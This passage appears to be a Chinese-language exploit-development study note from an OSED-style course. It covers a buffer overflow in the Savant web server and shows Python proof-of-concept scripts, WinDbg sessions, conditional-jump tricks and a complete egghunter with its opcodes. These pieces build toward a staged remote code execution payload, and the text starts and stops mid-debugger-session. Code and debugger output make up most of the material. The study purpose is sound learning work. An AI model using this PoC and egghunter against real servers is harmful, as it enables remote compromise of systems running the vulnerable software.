     0 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674
     
0:008> g
Breakpoint 0 hit
eax=00000000 ebx=01465750 ecx=0000000e edx=77d94550 esi=01465750 edi=0041703c
eip=00418674 esp=0304ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18674:
00418674 58              pop     eax

0:003> dc poi(@esp+4)
0304ea84  43434343 43434343 00000000 00000000  CCCCCCCC........
0304ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA
0304eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0304eab4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0304eac4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0304ead4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0304eae4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0304eaf4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```
> 成功停在 `00418674 58  pop eax`\
> GET 已經變成 CCCCCCCC

嘗試使用 Short Jump，直接跳到後面的 0x41 buffer\
👉🏻 估計需要跳過 0x17 bytes (`JMP SHORT 0x17`)
```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\xeb\x17\x90\x90" + b" /"  # Short jump of 0x17
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))      # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest
...
```

Windbg:\
(先設定 bp 0x00418674，然後執行 PoC)
```dbg
Breakpoint 0 hit
eax=00000000 ebx=01475750 ecx=0000000e edx=77d94550 esi=01475750 edi=0041703c
eip=00418674 esp=0306ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18674:
00418674 58              pop     eax

0:003> t
eax=0306fe70 ebx=01475750 ecx=0000000e edx=77d94550 esi=01475750 edi=0041703c
eip=00418675 esp=0306ea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18675:
00418675 c3              ret

0:003> t
eax=0306fe70 ebx=01475750 ecx=0000000e edx=77d94550 esi=01475750 edi=0041703c
eip=0306ea84 esp=0306ea34 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
0306ea84 cb              retf                                        ..

0:003> db @eip L2
0306ea84  cb 17                                            ..

0:003> u @eip
0306ea84 cb              retf
0306ea85 17              pop     ss
0306ea86 90              nop
0306ea87 90              nop
0306ea88 0000            add     byte ptr [eax],al
0306ea8a 0000            add     byte ptr [eax],al
0306ea8c 0000            add     byte ptr [eax],al
0306ea8e 0000            add     byte ptr [eax],al

```
> - `eip=0306ea84` 代表又成功回到 HTTP Method 的開頭\
>
> 預期應該看到 `0306ea84 eb17  jmp 0306ea9d` \
> 實際卻是：
> ```
>0306ea84 cb  retf
>0306ea85 17  pop ss
>0306ea86 90  nop
>0306ea87 90  nop
> ```

>[!Important]
>**為什麼 EB 變成 CB？**\
>原本送出的 bytes: `EB 17 90 90`\
>但是 WinDbg 看到: `CB 17 90 90`
>> 原本的 `EB 17` 是 `JMP SHORT`\
>> 變成 `CB` (Disassembly) [RETF](https://www.ibm.com/docs/en/zos/3.1.0?topic=commands-retf)\
>> 原本送出的 0xEB 在儲存到記憶體時已經被改變\
>> 🧠 上述檢查的 Bad Character Test 把所有可能的 bytes 放進主要的 inputBuffer，再檢查資料是否被改變\
>> 可以推測 HTTP Method 和主要的 inputBuffer 可能使用不同的記憶體配置，也經過不同的處理程序

### Conditional Jumps
>[!Note]
>**Conditional Jump**
>一般的 Unconditional Jump `JMP destination` 不需要任何條件，執行到這個指令就會跳轉\
>Conditional Jump `JE destination` 只有符合特定條件時才會跳轉\
>![image](https://hackmd.io/_uploads/ryzy7xiaMg.png)

JE 的條件是 `ZF = 1` 在 Zero Flag 必須為 1 才會跳躍\
代表只需要先想辦法讓 ZF 一定是 1，就能控制 JE 跳躍
1. 使用 [XOR](https://w3.tcivs.tc.edu.tw/ischool/publish_page/91/) 和 TEST 操作設定 CPU Flags
2. 讓 Zero Flag（ZF）變成 1
3. 使用 JE 指令
4. 讓 JE 跳到 0x41 buffer

```
XOR ECX, ECX
       ↓
ECX = 0

TEST ECX, ECX
       ↓
0 AND 0 = 0
       ↓
ZF = 1

JE destination
       ↓
因為 ZF = 1
       ↓
執行跳躍
```

使用 msf-nasm_shell 取得這兩條指令的 Assembly Opcodes
```
┌──(chw💲CHW)-[~]
└─$ msf-nasm_shell
[2026-11-06 01:46:56] msf-nasm_shell
nasm > xor ecx, ecx
00000000  31C9              xor ecx,ecx

nasm > test ecx, ecx
00000000  85C9              test ecx,ecx

nasm > je 0x17
00000000  0F8411000000      jz near 0x17
```
> JE 的 Near Jump 編碼是 `0F 84 <32-bit relative displacement>` 相對位移是以下一條指令的位址為基準計算\
> - `0F 84 11 00 00 00` 這條 JE 指令長度是 6 bytes

>[!Tip]
>`31 C9 85 C9 0F 84 11 00 00 00` Opcode 裡面有 Null bytes，但因為 HTTP Method 使用的記憶體配置在複製 HTTP Method 前，已經被清成 0\
>可以只送入 `31 C9 85 C9 0F 84 11`\
>⚠️ 輸入資料中不能包含 Null byte，🥚 不代表最後記憶體中的指令不能包含 Null byte


更新 PoC：使用 Conditional Jump
```python
server = sys.argv[1]
port = 80
size = 253

httpMethod = (
    b"\x31\xC9\x85\xC9\x0F\x84\x11"
    + b" /"
)

inputBuffer = b"\x41" * size
inputBuffer += pack("<L", (0x418674))

httpEndRequest = b"\r\n\r\n"

buf = httpMethod + inputBuffer + httpEndRequest
```
![image](https://hackmd.io/_uploads/H1P8jxjpMe.png)

Windbg:\
命中 bp 後先不要直接執行 RET，檢查 RET 即將返回的位置
```dbg
eax=02fefe70 ebx=01565750 ecx=0000000e edx=77d94550 esi=01565750 edi=0041703c
eip=00418675 esp=02feea30 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18675:
00418675 c3              ret

0:003> u poi(@esp) L3
02feea84 31c9            xor     ecx,ecx
02feea86 85c9            test    ecx,ecx
02feea88 0f8411000000    je      02feea9f
```
> 原本希望執行:
> ```
> XOR ECX, ECX
> TEST ECX, ECX
> JE
> ```
> 成功避開了 Short Jump 的問題

單步執行 XOR 和 TEST，確認 ZF = 1
```dbg
eax=02fefe70 ebx=01565750 ecx=00000000 edx=77d94550 esi=01565750 edi=0041703c
eip=02feea88 esp=02feea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02feea88 0f8411000000    je      02feea9f                                [br=1]

0:003> r @zf
zf=1

0:003> dd 02feea9f - 4
02feea9b  41412f00 41414141 41414141 41414141
02feeaab  41414141 41414141 41414141 41414141
02feeabb  41414141 41414141 41414141 41414141
02feeacb  41414141 41414141 41414141 41414141
02feeadb  41414141 41414141 41414141 41414141
02feeaeb  41414141 41414141 41414141 41414141
02feeafb  41414141 41414141 41414141 41414141
02feeb0b  41414141 41414141 41414141 41414141
```
> `dd 02feea9f - 4` 查看 JE 的目的地: 原本的 A buffer
>> 成功跳入 0x41 buffer ‼️

計算剩餘 Shellcode 空間
```dbg
0:003> db @eip L100
02feea9f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02feeaaf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
...
02feeb7f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02feeb8f  41 41 41 41 41 41 41 41-41 41 41 74 86 41 00 00  AAAAAAAAAAAt.A..
0:003> ? 02feeb8f + 0n11 - @eip
Evaluate expression: 251 = 000000fb
```
`74 86 41 00 00` 是先前放入的位址以及後續的 Null bytes\
👉🏻 251 bytes 可當作 Shellcode 空間

Metasploit 產生的 Shellcode 通常超過 300 bytes\
![image](https://hackmd.io/_uploads/SJzk0li6Gx.png)


## Finding Alternative Places to Store Large Buffers
不把所有 Shellcode 都放在發生 Buffer Overflow 的那個 Buffer 裡，而是另外找一塊記憶體，存放更大的 Payload\
(也可以改用功能較少、體積較小的 Payload)
- Stage 1： 放在目前空間有限的 Buffer，負責尋找並跳轉到第二個 Buffer
- Stage 2： 放在另一塊較大的記憶體區域，存放真正的大型 Shellcode

修改 PoC 在 HTTP Request 結束前加入 Buffer
加入識別字串 ("w00tw00t")，以便在記憶體中尋找\
後面注入 400 bytes "D" (Shellcode 空間)
```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n"
  httpEndRequest+= b"w00tw00t" + b"\x44" * 400
  httpEndRequest+= b"\r\n\r\n"

  buf = httpMethod + inputBuffer + httpEndRequest
...
```
Windbg:
```dbg
Breakpoint 0 hit
eax=00000000 ebx=013656a8 ecx=0000000e edx=77284550 esi=013656a8 edi=0041703c
eip=00418674 esp=016cea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18674:
00418674 58              pop     eax

0:003> s -a 0x0 L?80000000 w00tw00t
01365a5e  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD

0:003> db 01365a5e + 0n408 - 4 L4
01365bf2  44 44 44 44                                      DDDD
```
>⁉️ Application 沒有 Crash\
>代表額外 Buffer 放在 HTTP Request 結束前的位置

修改 PoC
```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 
  inputBuffer = b"\x41" * size
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  shellcode = b"w00tw00t" + b"\x44" * 400

  buf = httpMethod + inputBuffer +  httpEndRequest + shellcode
...
```
> HTTP Method + 主要漏洞 Buffer + HTTP Request 結束符號 + 第二份 Buffer

Windbg:
```dbg
Breakpoint 0 hit
eax=00000000 ebx=013656a8 ecx=0000000e edx=77284550 esi=013656a8 edi=0041703c
eip=00418674 esp=016cea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Savant+0x18674:
00418674 58              pop     eax

0:003> s -a 0x0 L?80000000 w00tw00t
01365a5e  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD

0:003> db 01365a5e + 0n408 - 4 L4
01365bf2  44 44 44 44           
```
> - `EIP = 00418674` 表示成功抵達原本的 POP EAX
> - `s`: Search 搜尋記憶體
> - `-a`:以 ASCII 字串搜尋
> - `0x0`:搜尋起始位址
> - `L?80000000`:搜尋長度
>
> w00tw00t 位於 `0x01365a5e`
> 確認整份 Buffer 是否完整 `db 01365a5e + 0n408 - 4 L4`

### The Windows Heap Memory Manage
Windows Heap 記憶體管理器\
目前已知第二份 Buffer = 0x01365a5e ，先確認第二份 Buffer 不在 Stack
```dbg
0:003> !teb
TEB at 7ffdb000
    ExceptionList:        016cff70
    StackBase:            016d0000
    StackLimit:           016cc000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 7ffdb000
    EnvironmentPointer:   00000000
    ClientId:             00001400 . 00001548
    RpcHandle:            00000000
    Tls Storage:          0031f6d0
    PEB Address:          7ffdf000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0
```
> Stack: `0x016cc000 ~ 0x016d0000`\
> Secondary Buffer: `0x01365a5e`\
> Buffer 不是存放在目前 Thread 的 Stack 中

使用 [!address](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-address) 查詢記憶體區域
```dbg
0:003> !address 01365a5e  

Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  Heap
Base Address:           01360000
End Address:            0136f000
Region Size:            0000f000 (  60.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        01360000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              heap owning the address: !heap 0x1360000
More info:              heap segment
More info:              heap entry containing the address: !heap -x 0x1365a5e

Content source: 1 (target), length: 5a2
```
> **Usage: Heap** 存放在 Heap 記憶體區域\
> Base Address: 01360000\
> End Address: 0136f000\
> Region Size 0xF000 = 61,440 bytes = `60 KB`
> - `State`: MEM_COMMIT 表示這段虛擬記憶體已經提交，可以供 Process 使用
> - `Protect`: 可讀寫
> - `Type`: MEM_PRIVATE 表示是 Process 的私有記憶體區域
> 
> `!heap 0x1360000`：可以進一步查看擁有這個位址的 Heap
> `!heap -x 0x1365a5e`：可以查詢包含該位址的 Heap Entry


>[!Note]
>Windows Heap Memory Manager
>位於 Windows Virtual Memory 介面之上的一層軟體管理機制，讓 Application 可以動態要求或釋放記憶體，不必自己管理每一塊記憶體的細節\
>![image](https://hackmd.io/_uploads/r1heQMi6Gl.png)

Windows 的記憶體配置 API ([VirtualAllocEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex), [VirtualFreeEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualfreeex), [HeapAlloc](https://docs.microsoft.com/en-us/windows/desktop/api/HeapApi/nf-heapapi-heapalloc), [HeapFree](https://docs.microsoft.com/en-gb/windows/desktop/api/heapapi/nf-heapapi-heapfree))可以用來動態配置或釋放記憶體:\
![image](https://hackmd.io/_uploads/rJMrQfipfg.png)\
API 最終會使用 ntdll.dll 中的 Native Function ([RtlAllocateHeap](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-rtlallocateheap) and [RtlFreeHeap](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-rtlfreeheap))\
![image](https://hackmd.io/_uploads/rJItmfopGg.png)
```
Application
    ↓
HeapAlloc / HeapFree
    ↓
ntdll.dll
    ↓
RtlAllocateHeap / RtlFreeHeap
    ↓
Windows Memory Management
```
Application 使用的動態記憶體，背後是由 Windows Heap Manager 與 Virtual Memory Manager 協調管理\
當 Windows Process 啟動時，Heap Manager 會自動建立一個 Heap `Default Process Heap` 預設 Process Heap\
Heap 是一大塊記憶體空間，再被切分成較小的區域，提供 Application 使用:
```
Default Process Heap
┌──────────────────────────────┐
│ Allocation A                 │
├──────────────────────────────┤
│ Allocation B                 │
├──────────────────────────────┤
│ Allocation C                 │
├──────────────────────────────┤
│ Free Space                   │
├──────────────────────────────┤
│ Allocation D                 │
└──────────────────────────────┘
```
- 當 Application 要求配置記憶體時，Heap Manager 會從 Heap 中安排適當的空間
- 當 Application 釋放記憶體時，Heap Manager 會將相應的空間重新納入管理

有些 Process 只使用 Default Process Heap，🥚 有些 Process 會建立額外的 Heap
透過 [HeapCreate](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate) API 或更 lower-level 的 [ntdll!RtlCreateHeap](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-rtlcreateheap)\
(多個 Heap 可以用來隔離同一個 Process 中不同的 Components)

>[!Note]
>[C Runtime Heap](https://learn.microsoft.com/en-us/cpp/c-runtime-library/crt-debug-heap-details?view=msvc-170):\
>另一種常見的 Heap 使用方式，在 C/C++ 中，常見 `malloc()`, `free()` 。Ex. `char *buffer = malloc(400);` 要求配置 400 bytes 的動態記憶體\
>使用完畢後 `free(buffer);` 釋放記憶體
>
>許多 Process 會大量使用 C Runtime Heap 進行動態配置。這些 Heap 實作屬於 NT Heap，最終仍然會使用 Windows Heap Manager 的功能，透過 ntdll.dll 與 Windows Virtual Memory Manager 進行動態記憶體管理
>```
>C Application
>    ↓
>malloc()
>    ↓
>C Runtime Heap
>    ↓
>Windows Heap Manager
>    ↓
>ntdll.dll
>    ↓
>Windows Virtual Memory Manager
>```
>Sum: 不論 Application 是直接使用 Windows Heap API，或是透過 C Runtime 的 malloc/free，最終都會涉及 Windows 的記憶體管理機制

無法預先知道動態配置的 Buffer 位址，所以不能單純使用固定 Offset，從目前的 EIP 或其他位置直接計算到第二份 Buffer

目前進度：\
![image](https://hackmd.io/_uploads/HyFHjfoTzl.png)

## Finding our Buffer - The Egghunter Approach
Egghunter 目的是讓第一階段的小型程式碼在記憶體中搜尋一個特定標記（egg），找到後再跳到標記後面的真正 payload

目前已經找到第二段 Buffer `w00tw00tDDDDDDDDDDDD..` 們不能直接寫 `jmp 0x01365a5e` 

>[!Important]
>找到一個很讚的 Egg Hunting Blog:\
>[Windows Exploit Development: Egg Hunting](https://shellcode.blog/Windows-Exploitation-Egg-hunting/?utm_source=chatgpt.com)\
>![image](https://hackmd.io/_uploads/HJyA3fiTfl.png)
>
>Egghunter 的基本概念:
Egghunter 是一段非常小的第一階段程式碼（Stage 1），負責搜尋整個 Process Virtual Address Space（VAS）\
>它會尋找一個事先指定的唯一標記 `w00tw00t` (這個標記就是 Egg)\
>假設 Heap 中存放了 w00tw00t:
>```
>Stage 1：Egghunter 開始執行
>        |
>        v
>掃描 Process Virtual Address Space
>        |
>        v
>尋找 w00tw00t
>        |
>        v
>找到第一個 w00t
>        |
>        v
>確認第二個 w00t 是否緊接在後
>        |
>        v
>兩個都符合？
>        |
>        v
>跳過 Egg，跳到後面的 Shellcode
>```

### Keystone Engine
介紹 [Keystone Engine](http://www.keystone-engine.org/) 接著會需要撰寫 Egghunter Assembly

- 安裝 Keystone
```
┌──(chw💲CHW)-[~]
└─$ sudo apt install python3-pip

┌──(chw💲CHW)-[~]
└─$ pip install keystone-engine
```

- Keystone 基本程式
編寫一個簡單的範例，輸出各種 assembly instructions 的 opcodes
```python
from keystone import *

CODE = (
    "                        "
    " start:                 "
    "     xor eax, eax      ;"
    "     add eax, ecx      ;"
    "     push eax          ;"
    "     pop esi           ;"
)

# Initialize engine in 32-bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)

instructions = ""
for dec in encoding:
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")

print("Opcodes = (\"" + instructions + "\")")
```
> - 初始化 Keystone: `ks = Ks(KS_ARCH_X86, KS_MODE_32)`
>    - KS_ARCH_X86：使用 x86 Architecture
>    - KS_MODE_32：使用 32-bit Mode
>
>- 轉換 Assembly: `encoding, count = ks.asm(CODE)`\
>ks.asm() 負責組譯
>
>- 轉換成 Shellcode 格式: `  instructions += "\\x{0:02x}".format(int(dec))`\
>將每一個 Byte 轉成 \x31, \xC0 等等

- 執行結果
```
┌──(chw💲CHW)-[~/Offsec/OSED/Keystone]
└─$ python3 keystone_0x01.py
Opcodes = ("\x31\xc0\x01\xc8\x50\x5e")
```
![image](https://hackmd.io/_uploads/ry-rS7ipfx.png)\
![image](https://hackmd.io/_uploads/ryTHBQoafl.png)

逐條驗證 Opcode\
![image](https://hackmd.io/_uploads/BJa_Hmj6fe.png)

得到相同結果，代表 Keystone 產生的 Opcode 與 NASM 組譯結果一致\
在某些情況下，Keystone 產生的 Opcode 可能不正確，不能只相信 Python Script 的輸出:\
![image](https://hackmd.io/_uploads/HkdAS7i6Ml.png)

### System Calls and Egghunters
使用 Matt Miller 早期公開的 Egghunter 技術，並透過 Windows System Call 判斷記憶體地址是否可以存取

🧠: 為什麼不直接掃描記憶體？
```
0x00000000
0x00001000
0x00002000
0x00003000
...
```
👉🏻 不能直接對每個位址執行 `mov eax, [edx]` ，有些 address 根本沒有 Mapping 或沒有讀取權限\
若直接讀取可能發生 `STATUS_ACCESS_VIOLATION` 導致程式崩潰


>[!Note]
>System Call:\
>![image](https://hackmd.io/_uploads/SyoRtoR6Mg.png)\
>當 Application 需要 OS 核心提供服務時，就會透過 System Call 進入 Kernel Mode:
>```
>User Mode Application
>        |
>        v
>設定 System Call Number
>        |
>        v
>設定參數
>        |
>        v
>執行 System Call 指令
>        |
>        v
>Kernel Mode
>        |
>        v
>執行作業系統服務
>        |
>        v
>回傳結果到 User Mode
>```

System Call 如何幫助 Egghunter，讓 Windows 嘗試存取我們指定的記憶體位置\
如果該地址無法存取，系統在處理呼叫參數時就可能產生 Access Violation，並回傳錯誤碼\
Egghunter 必須先確認記憶體位址是否能安全存取，再進行 Egg 比對
- 利用 [NtAccessCheckAndAuditAlarm](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSecurity%2FNtAccessCheckAndAuditAlarm.html)
Windows Native API，函式執行前檢查回傳 [STATUS_NO_IMPERSONATION_TOKEN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55) (0xc000005c)\
若傳入的參數位址無法存取，會得到 [STATUS_ACCESS_VIOLATION](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55) (0xC0000005)\
Egghunter 利用這兩種結果來區分記憶體頁面是否可用

Egghunter 完整 Assembly:
```python
from keystone import *

CODE = (
		# We use the edx register as a memory page counter
"							 " 
"	loop_inc_page:			 "
		# Go to the last address in the memory page
"		or dx, 0x0fff		;" 
"	loop_inc_one:			 "
		# Increase the memory counter by one
"		inc edx				;"
"	loop_check:				 "
		# Save the edx register which holds our memory 
		# address on the stack
"		push edx			;"
		# Push the system call number
"		push 0x2 			;" 
		# Initialize the call to NtAccessCheckAndAuditAlarm
"		pop eax				;" 
		# Perform the system call
"		int 0x2e			;" 
		# Check for access violation, 0xc0000005 
		# (ACCESS_VIOLATION)
"		cmp al,05			;" 
		# Restore the edx register to check later 
		# for our egg
"		pop edx				;" 
"	loop_check_valid:		 "
		# If access violation encountered, go to n
		# ext page
"		je loop_inc_page	;" 
"	is_egg:					 "
		# Load egg (w00t in this example) into 
		# the eax register
"		mov eax, 0x74303077	;" 
		# Initializes pointer with current checked 
		# address 
"		mov edi, edx		;" 
		# Compare eax with doubleword at edi and 
		# set status flags
"		scasd				;" 
		# No match, we will increase our memory 
		# counter by one
"		jnz loop_inc_one	;" 
		# First part of the egg detected, check for 
		# the second part
"		scasd				;" 
		# No match, we found just a location 
		# with half an egg
"		jnz loop_inc_one	;" 
"	matched:				 "
		# The edi register points to the first 
		# byte of our buffer, we can jump to it
"		jmp edi				;" 
)

# Initialize engine in 32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
egghunter = ""
for dec in encoding: 
  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")
  
print("egghunter = (\"" + egghunter + "\")")

```
可以分成四個部分：
- 記憶體頁面位址遞增
- 呼叫 System Call 檢查記憶體。
- 判斷是否發生 Access Violation。
- 比對 Egg，找到後跳轉

1. Moving to the next memory page
```asm
loop_inc_page:
    or dx, 0x0fff

loop_inc_one:
    inc edx
```
> - `or dx, 0x0fff`: DX 是 EDX 的低 16 bits，執行 OR 後，DX 的最低 12 bits 都會變成 1
> Ex. 原本 EDX = 0x12345678，低 16 bits DX = 0x5678\
> 執行 or dx, 0x0fff 後，EDX = 0x12345fff\
> (目前 4KB Memory Page 的最後一個 Byte)
> - `inc edx`: EDX 加 1，指向下一個 4KB Memory Page 的開頭\
> ![image](https://hackmd.io/_uploads/B15p72Apzg.png)

為什麼不直接使用 `and edx, 0xfffff000` ?!!\
Opcode 可能包含 Null Byte

2. Performing the system call
```asm
loop_check:
    push edx
    push 0x2
    pop eax
    int 0x2e
```
> - `push edx`: 保存 EDX
> - `push 0x2 pop eax`: 設定 System Call Number
> - `int 0x2e`: 執行 System Call

3. Verify if the memory page is valid
```asm
cmp al, 0x05
pop edx

loop_check_valid:
    je loop_inc_page
```
> System Call 回傳 `EAX = 0xC0000005` 代表 `STATUS_ACCESS_VIOLATION`\
> - `cmp al, 0x05`: 最低 8 bits 是 AL = 0x05，可以判斷是否為 Access Violation
> - `pop edx`: 將先前保存的 EDX 還原
> - `je loop_inc_page`: 若 AL 等於 0x05，CMP 結果相等 ZF = 1 JE 成立，將 EDX 移動到下一個 Memory Page

4. Check the first part of our egg
```asm
is_egg:
    mov eax, 0x74303077
    mov edi, edx
    scasd
    jnz loop_inc_one
```
> - `mov eax, 0x74303077`: 載入 Egg，x86 Little Endian `77 30 30 74` (ASCII) w00t
> - `mov edi, edx`: 設定 EDI，EDX 是目前正在檢查的記憶體地址。複製到 EDI 作為後續字串比較的指標
> - `scasd`: SCASD 會將 `EAX` 與 `ES:[EDI]` 指向的 DWORD 比較。根據比較結果設定 Flags 自動調整 ED\
> 在 32-bit 預設方向旗標 DF = 0 時，EDI 會增加 4:
>    - 執行前：EDI = 0x12346000
>    - 執行後：EDI = 0x12346004
> - `jnz loop_inc_one`: 判斷是否符合，若比較結果不相等，ZF = 0，JNZ 就成立。Egghunter 不只在 Page 之間移動，也會在可用的記憶體範圍內逐 Byte 搜尋 Egg

5. Check the second part of our egg
```asm
scasd
jnz loop_inc_one

matched:
    jmp edi
```
> 第一個 SCASD 已經比對 w00t 且 EDI 已經自動增加 4。所以第二個 scasd 會比較下一個 DWORD w00t\
> 👉🏻 如果兩次都相等代表找到 w00tw00t
> - `jmp edi`: 跳到真正的 Payload
>
> ![image](https://hackmd.io/_uploads/ryRXZCApMg.png)

取得 Egghunter Opcode
```python
egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x89\xd7"
"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)
```
![image](https://hackmd.io/_uploads/ryS_Z00pGe.png)

加入 PoC
```python
...
try:
  server = sys.argv[1]
  port = 80
  size = 253

  httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17 

  egghunter = (b"\x90\x90\x90\x90\x90\x90\x90\x90"      # NOP sled
               b"\x66\x81\xca\xff\x0f\x42\x52\x6a"
               b"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
               b"\xef\xb8\x77\x30\x30\x74\x89\xd7"
               b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

  inputBuffer = b"\x41" * (size - len(egghunter))
  inputBuffer+= pack("<L", (0x418674))                  # 0x00418674 - pop eax; ret
  httpEndRequest = b"\r\n\r\n"

  shellcode = b"w00tw00t" + b"\x44" * 400

  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode
...

```

Windbg 驗證 PoC
```
┌──(chw💲CHW)-[~]
└─$ python3 original_egghunter.py
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
```
```dbg
0:003> ph
eax=02f0fe70 ebx=014256d0 ecx=00000000 edx=77184550 esi=014256d0 edi=0041703c
eip=02f0ea88 esp=02f0ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02f0ea88 0f8411000000    je      02f0ea9f                                [br=1]

0:003> u 02f0ea9f L16
02f0ea9f 90              nop
02f0eaa0 90              nop
02f0eaa1 90              nop
02f0eaa2 90              nop
02f0eaa3 90              nop
02f0eaa4 90              nop
02f0eaa5 6681caff0f      or      dx,0FFFh
02f0eaaa 42              inc     edx
02f0eaab 52              push    edx
02f0eaac 6a02            push    2
02f0eaae 58              pop     eax
02f0eaaf cd2e            int     2Eh
02f0eab1 3c05            cmp     al,5
02f0eab3 5a              pop     edx
02f0eab4 74ef            je      02f0eaa5
02f0eab6 b877303074      mov     eax,74303077h
02f0eabb 89d7            mov     edi,edx
02f0eabd af              scas    dword ptr es:[edi]
02f0eabe 75ea            jne     02f0eaaa
02f0eac0 af              scas    dword ptr es:[edi]
02f0eac1 75e7            jne     02f0eaaa
02f0eac3 ffe7            jmp     edi
```
> `eip=02f0ea88`: 代表目前停在前面設定的條件跳轉
> - `u 02f0ea9f L16`: 反組譯從 02f0ea9f 開始的 16 條指令
> ```
>02f0ea9f 90              nop
>02f0eaa0 90              nop
>02f0eaa1 90              nop
>...
>02f0eaa5 6681caff0f      or dx,0FFFh
>02f0eaaa 42              inc edx
>02f0eaab 52              push edx
>...
>02f0eac3 ffe7            jmp edi
> ```

可以確認 Egghunter 已經正確存在於記憶體中，沒有被 HTTP Request 過程破壞

接著確認第二段 Buffer、設定 Breakpoint
```dbg
0:003> s -a 0x0 L?80000000 w00tw00t
01425a86  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD

0:003> bp 02f0eac3 

0:003> bl
     0 e Disable Clear  00418674     0001 (0001)  0:**** Savant+0x18674
